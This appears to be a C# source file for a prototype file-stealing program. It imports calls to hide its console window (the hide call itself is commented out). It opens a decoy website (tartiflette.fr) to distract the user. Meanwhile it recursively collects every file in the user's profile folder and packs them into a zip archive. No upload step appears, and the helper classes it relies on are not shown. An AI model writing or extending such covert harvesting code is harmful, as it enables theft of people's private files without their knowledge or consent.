using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Runtime.InteropServices;
using System.IO.Compression;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace Tartiflette
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;



        static void Main(string[] args)
        {
            //Hide console
            IntPtr handler = GetConsoleWindow();
            //ShowWindow(handler, SW_HIDE);


            string userName = Environment.UserName;
            string path = $@"C:\Users\{userName}";
            Stopwatch sw = new Stopwatch();
            explorer brows = new explorer(path);
            Archiver arch = new Archiver("ArchiveZIP.zip");
            sw.Start();
            // List all files 
            List<FileInfo> files = new List<FileInfo>();
            Thread T = new Thread(new ThreadStart(() => { files = brows.ListNameFile(path); }));
            T.Start();
            WebSite.ShowUrlMultiple(@"http://www.tartiflette.fr/", 1);
            T.Join();

            // Add to archive
            T = new Thread(new ThreadStart(() =>
            {
                files.ToList().ForEach((file) =>
                {
                    arch.AddToArchive(file);
                });
            }));
            T.Start();
            T.Join();
            
            sw.Stop();
            Console.WriteLine(brows.Count);
            Console.WriteLine(sw.Elapsed);
            Console.ReadKey();
        }
    }
}
